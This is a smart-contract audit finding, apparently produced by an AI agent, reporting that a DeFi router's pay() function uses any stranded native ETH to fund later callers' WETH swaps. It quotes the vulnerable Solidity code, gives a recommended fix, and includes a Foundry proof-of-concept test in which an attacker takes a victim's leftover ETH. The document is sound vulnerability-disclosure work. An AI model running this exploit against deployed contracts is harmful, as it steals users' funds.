I have the key `pay` function. Let me now read the `exactInputSingle` and callback flow to trace the full attack path.

Now I have everything needed to make a definitive determination. Let me trace the exact attack path through the code.

### Title
Unattributed Native ETH in `pay()` Allows Cross-Transaction Theft of Victim's Stranded ETH — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`PeripheryPayments.pay()` uses the router's entire `address(this).balance` as a payment source for any WETH swap, with no per-caller attribution. Native ETH stranded on the router from a victim's prior transaction (e.g., excess `msg.value` sent without a `refundETH()` step) is silently consumed to fund a subsequent attacker's WETH swap, resulting in direct loss of the victim's ETH.

---

### Finding Description

The `pay` function branches on `token == WETH` and reads `address(this).balance` unconditionally: [1](#0-0) 

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
```

There is no check that the native ETH on the router was contributed by the current `payer`. Any ETH present — regardless of origin — is deposited as WETH and forwarded to the pool on behalf of the current caller.

Native ETH can be stranded on the router between transactions because `exactInputSingle`, `exactInput`, `exactOutputSingle`, and `exactOutput` are all `payable`: [2](#0-1) 

If a user calls `exactInputSingle{value: X}(amountIn: Y)` where `X > Y` (or calls `multicall{value: X}` without a `refundETH()` step), the surplus `X - Y` ETH remains on the router after the transaction. The `receive()` guard only blocks direct ETH pushes; it does not prevent `msg.value` from accumulating via payable entry points: [3](#0-2) 

The test suite explicitly demonstrates the expected pattern of including `refundETH()` to recover unused ETH, confirming that omitting it leaves ETH stranded: [4](#0-3) 

---

### Impact Explanation

**Direct loss of victim's native ETH.** An attacker who observes stranded ETH on the router calls `exactInputSingle{value:0}(amountIn: strandedAmount, tokenIn: WETH)`. The `pay()` function deposits the victim's ETH as WETH and forwards it to the pool, funding the attacker's swap entirely for free. The victim's ETH is permanently lost; the attacker receives the full swap output at zero cost.

---

### Likelihood Explanation

The precondition — a user sending excess `msg.value` without `refundETH()` — is realistic in two common patterns:

1. **Direct `exactOutputSingle{value: buffer}` call**: users routinely send a buffer above the quoted input for exact-output swaps and rely on `refundETH()` in a multicall. Calling the function directly (not via multicall) strands the surplus with no in-transaction recovery path.
2. **Multicall without `refundETH()`**: any multicall that sends excess ETH and omits the refund step leaves the surplus on the router.

An attacker can monitor the router's ETH balance on-chain and front-run or follow any transaction that leaves a non-zero balance.

---

### Recommendation

Attribute native ETH to the current call by tracking how much `msg.value` was contributed in the current transaction (e.g., via a transient storage slot set at the payable entry point and decremented in `pay()`). Only the amount attributable to the current caller's `msg.value` should be eligible for the native-balance branch. Alternatively, require that `pay()` only uses native ETH when `msg.value > 0` in the current call frame, and enforce that any excess is refunded atomically before the entry point returns.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Foundry test sketch (pseudo-code, adapt to SimpleRouterTestBase fixture)
function test_crossTx_attackerStealsVictimStrandedETH() public {
    uint128 amountIn = 1_000;
    uint256 excess   = 1_000;          // victim overpays by this much
    uint256 msgValue = amountIn + excess;

    // --- Victim tx: sends excess ETH, no refundETH() ---
    vm.prank(victim);
    router.exactInputSingle{value: msgValue}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: amountIn,
            amountOutMinimum: 0,
            recipient: victim,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );
    // `excess` ETH is now stranded on the router
    assertEq(address(router).balance, excess, "ETH stranded");

    // --- Attacker tx: zero msg.value, steals victim's ETH ---
    uint256 attackerWethBefore = weth.balanceOf(attacker);
    uint256 attackerToken1Before = token1.balanceOf(attacker);

    vm.prank(attacker);
    router.exactInputSingle{value: 0}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: excess,          // exactly the stranded amount
            amountOutMinimum: 0,
            recipient: attacker,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    // Attacker received token1 output without spending any ETH or WETH
    assertEq(address(router).balance, 0,              "router drained");
    assertEq(weth.balanceOf(attacker), attackerWethBefore, "attacker WETH unchanged");
    assertGt(token1.balanceOf(attacker), attackerToken1Before, "attacker got output for free");
}
```

The assertion `attacker WETH unchanged` passes because `pay()` consumed the router's native ETH balance (the victim's stranded ETH) rather than pulling from the attacker's WETH allowance.

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-84)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-67)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
